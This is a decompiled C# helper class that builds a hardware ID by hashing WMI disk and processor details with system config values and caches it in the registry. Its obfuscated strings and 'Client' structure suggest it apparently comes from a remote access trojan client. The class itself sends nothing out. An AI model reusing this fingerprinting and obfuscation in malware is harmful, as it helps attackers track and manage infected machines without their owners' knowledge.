using System;
using System.Management;
using System.Security.Cryptography;
using System.Text;

namespace Client.Helper;

internal class HwidGenerator
{
	public static string hwid()
	{
		if (SetRegistry.CheckValue(EncryptString.Decode("Hwid")))
		{
			return SetRegistry.GetValue(EncryptString.Decode("Hwid"));
		}
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(Inf());
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		return ByteToStr(bytes);
	}

	private static string ByteToStr(byte[] buffer)
	{
		StringBuilder stringBuilder = new StringBuilder();
		foreach (byte b in buffer)
		{
			stringBuilder.Append(b.ToString(EncryptString.Decode("x2")));
		}
		return stringBuilder.ToString();
	}

	private static string identifier(string wmiClass, string wmiProperty)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		string text = "";
		ManagementObjectEnumerator enumerator = new ManagementClass(wmiClass).GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				if (text == "")
				{
					try
					{
						text = ((ManagementBaseObject)val)[wmiProperty].ToString();
					}
					catch
					{
						continue;
					}
					break;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return text;
	}

	private static string Inf()
	{
		return identifier(EncryptString.Decode("Win32_DiskDrive"), EncryptString.Decode("Model")) + identifier(EncryptString.Decode("Win32_DiskDrive"), EncryptString.Decode("Manufacturer")) + identifier(EncryptString.Decode("Win32_DiskDrive"), EncryptString.Decode("Name")) + identifier(EncryptString.Decode("Win32_Processor"), EncryptString.Decode("Name")) + Config.WindowsVersion + Config.Gpu + Config.DataInstall + Environment.ProcessorCount;
	}
}
